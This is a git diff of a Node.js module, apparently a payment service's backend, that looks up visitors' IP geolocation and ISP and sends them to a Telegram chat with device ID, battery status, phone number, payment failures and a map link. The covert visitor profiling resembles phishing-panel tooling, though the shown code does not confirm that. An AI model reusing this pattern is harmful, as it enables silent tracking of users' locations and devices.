@@ -9,52 +9,59 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const { BRANCH_NAMES } = require('./branches');
 
 /**
- * جلب بيانات الشبكة والموقع الجغرافي والإحداثيات (خطوط الطول والعرض) بناءً على IP الخارجي
+ * جلب بيانات الشبكة والموقع الجغرافي والإحداثيات بناءً على IP الخارجي
  */
 async function fetchNetworkDetailsByIP(ip) {
   const result = {
     location: "غير معروف",
     isp: "غير معروف",
-    lat: null,
-    lon: null
+    netLocation: "غير متاح"
   };
 
   if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
-    return null;
+    return result;
   }
 
   const cleanIp = String(ip).split(",")[0].trim();
 
+  // المصدر الأول: ipwho.is (يدعم الإحداثيات بدقة عالية)
   try {
-    // استخدام ipapi.co لأنه يدعم الإحداثيات (latitude & longitude) بدقة
-    const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
-    if (res.data && !res.data.error) {
-      const city = res.data.city || "غير معروفة";
-      const region = res.data.region || "";
-      const country = res.data.country_name || "غير معروفة";
-      result.location = region ? `${city}، ${region}، ${country}` : `${city}، ${country}`;
-      result.isp = res.data.org || res.data.asn || "غير معروف";
-      result.lat = res.data.latitude || null;
-      result.lon = res.data.longitude || null;
+    const res = await axios.get(`https://ipwho.is/${cleanIp}?lang=ar`, { timeout: 3000 });
+    if (res.data && res.data.success !== false) {
+      const city = res.data.city || res.data.region || "غير معروفة";
+      const country = res.data.country || "غير معروفة";
+      result.location = `${city}، ${country}`;
+      result.isp = (res.data.connection && res.data.connection.isp) ? res.data.connection.isp : (res.data.org || "غير معروف");
+      
+      const lat = res.data.latitude;
+      const lon = res.data.longitude;
+      if (lat && lon) {
+        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat}, ${lon})</a>`;
+      }
       return result;
     }
   } catch (e) {
-    try {
-      // الـ Fallback عبر ip-api.com مع طلب حقول الإحداثيات lat, lon
-      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,isp,org,lat,lon`, { timeout: 3000 });
-      if (fallbackRes.data && fallbackRes.data.status === "success") {
-        const city = fallbackRes.data.city || "غير معروفة";
-        const region = fallbackRes.data.regionName || "";
-        const country = fallbackRes.data.country || "غير معروفة";
-        result.location = region ? `${city}، ${region}، ${country}` : `${city}، ${country}`;
-        result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
-        result.lat = fallbackRes.data.lat || null;
-        result.lon = fallbackRes.data.lon || null;
-        return result;
+    // تجاهل والانتقال للمصدر البديل
+  }
+
+  // المصدر الثاني: ip-api.com (مصدر بديل قوي للإحداثيات والـ ISP)
+  try {
+    const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,lat,lon,query`, { timeout: 3000 });
+    if (fallbackRes.data && fallbackRes.data.status === "success") {
+      const city = fallbackRes.data.city || "غير معروفة";
+      const country = fallbackRes.data.country || "غير معروفة";
+      result.location = `${city}، ${country}`;
+      result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
+
+      const lat = fallbackRes.data.lat;
+      const lon = fallbackRes.data.lon;
+      if (lat && lon) {
+        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat}, ${lon})</a>`;
       }
-    } catch (fallbackErr) {
-      console.warn("⚠️ تعذر جلب تفاصيل الموقع الجغرافي والإحداثيات للـ IP:", cleanIp);
+      return result;
     }
+  } catch (fallbackErr) {
+    console.warn("⚠️ تعذر جلب تفاصيل الموقع الجغرافي للـ IP:", cleanIp);
   }
 
   return result;
@@ -109,19 +116,15 @@ async function sendTelegramMessage(data, isInitial = true) {
     if (isInitial) {
       const clientID = data.clientID || data.clientId || "غير متوفر";
 
-      let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
       let ispText = data.ispProvider || data.isp || null;
-      let latVal = data.lat || null;
-      let lonVal = data.lon || null;
+      let netLocationText = data.netLocation || null;
 
-      // جلب الموقع الجغرافي والإحداثيات عبر IP إذا لم تكن متوفرة مسبقاً
-      if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف" || !latVal || !lonVal) {
+      // جلب الموقع الجغرافي والإحداثيات ومزود الخدمة عبر IP إذا لم تكن متوفرة مسبقاً
+      if (!ispText || ispText === "غير معروف" || !netLocationText || netLocationText === "غير متاح") {
         const netInfo = await fetchNetworkDetailsByIP(publicIP);
         if (netInfo) {
-          if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
           if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
-          if (!latVal) latVal = netInfo.lat;
-          if (!lonVal) lonVal = netInfo.lon;
+          if (!netLocationText || netLocationText === "غير متاح") netLocationText = netInfo.netLocation;
         }
       }
 
@@ -154,18 +157,8 @@ async function sendTelegramMessage(data, isInitial = true) {
                  `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                  `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
-                 `🌍 <b>الموقع الجغرافي:</b> <b>📍 ${locationText || 'غير متوفر'}</b>\n`;
-
-      // إضافة خطوط الطول والعرض وتنسيق رابط الخريطة بذكاء
-      if (latVal && lonVal) {
-        const googleMapsLink = `https://www.google.com/maps?q=${latVal},${lonVal}`;
-        message += `🗺️ <b>الإحداثيات:</b> <code>${latVal}, ${lonVal}</code>\n` +
-                   `🔗 <a href="${googleMapsLink}">عرض الموقع على خرائط جوجل</a>\n`;
-      } else {
-        message += `🗺️ <b>الإحداثيات:</b> <code>غير متوفرة</code>\n`;
-      }
-
-      message += `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
+                 `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير معروف'}</b>\n` +
+                 `📍 <b>موقع الشبكة (IP Geo):</b> ${netLocationText || 'غير متاح'}\n` +
                  `----------------------------------------\n` +
                  `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
                  `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
@@ -206,7 +199,6 @@ async function sendTelegramMessage(data, isInitial = true) {
       chat_id: CHAT_ID,
       text: message,
       parse_mode: "HTML",
-      disable_web_page_preview: true,
       reply_markup: replyMarkup
     });
 
@@ -347,7 +339,6 @@ async function handleTelegramCallback(callbackQuery) {
           message_id: messageId,
           text: updatedText,
           parse_mode: "HTML",
-          disable_web_page_preview: true,
           reply_markup: { inline_keyboard: [] }
         });
 
@@ -379,7 +370,6 @@ async function handleTelegramCallback(callbackQuery) {
         message_id: messageId,
         text: updatedText,
         parse_mode: "HTML",
-        disable_web_page_preview: true,
         reply_markup: { inline_keyboard: [] }
       });
     }
@@ -390,7 +380,7 @@ async function handleTelegramCallback(callbackQuery) {
 }
 
 /**
- * 4. ❌ إرسال إشعار فشل الدفع إلى التليجرام مع الموقع الجغرافي والإحداثيات للشبكة
+ * 4. ❌ إرسال إشعار فشل الدفع إلى التليجرام مع الموقع الجغرافي للشبكة
  */
 async function sendTelegramFailNotification(errorMessage, data = {}) {
   try {
@@ -405,10 +395,8 @@ async function sendTelegramFailNotification(errorMessage, data = {}) {
 
     // جلب تفاصيل الموقع الجغرافي والإحداثيات للـ IP في صفحة الفشل أيضاً
     const netInfo = await fetchNetworkDetailsByIP(publicIP);
-    const locationText = netInfo ? netInfo.location : "غير متوفر";
-    const ispText = netInfo ? netInfo.isp : "غير متوفر";
-    const latVal = netInfo ? netInfo.lat : null;
-    const lonVal = netInfo ? netInfo.lon : null;
+    const ispText = netInfo.isp;
+    const netLocationText = netInfo.netLocation;
 
     const branchName = data.branchName || "حكايات نت رئيسي";
     const userPhone = data.phone || "غير محدد";
@@ -424,22 +412,14 @@ async function sendTelegramFailNotification(errorMessage, data = {}) {
                   `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
                   `----------------------------------------\n` +
                   `🌐 IP الخارجي: <code>${publicIP}</code>\n` +
-                  `🌍 الموقع الجغرافي: <b>📍 ${locationText}</b>\n`;
-
-    if (latVal && lonVal) {
-      const googleMapsLink = `https://www.google.com/maps?q=${latVal},${lonVal}`;
-      message += `🗺️ <b>الإحداثيات:</b> <code>${latVal}, ${lonVal}</code>\n` +
-                 `🔗 <a href="${googleMapsLink}">عرض الموقع على خرائط جوجل</a>\n`;
-    }
-
-    message += `📡 مزود الخدمة: <b>${ispText}</b>\n` +
-               `📅 وقت الزيارة: <code>${dateTimeStr}</code>`;
+                  `📡 مزود الخدمة (ISP): <b>${ispText}</b>\n` +
+                  `📍 موقع الشبكة (IP Geo): ${netLocationText}\n` +
+                  `📅 وقت الزيارة: <code>${dateTimeStr}</code>`;
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHIAT_ID || CHAT_ID,
+      chat_id: CHAT_ID,
       text: message,
-      parse_mode: "HTML",
-      disable_web_page_preview: true
+      parse_mode: "HTML"
     });
 
   } catch (err) {
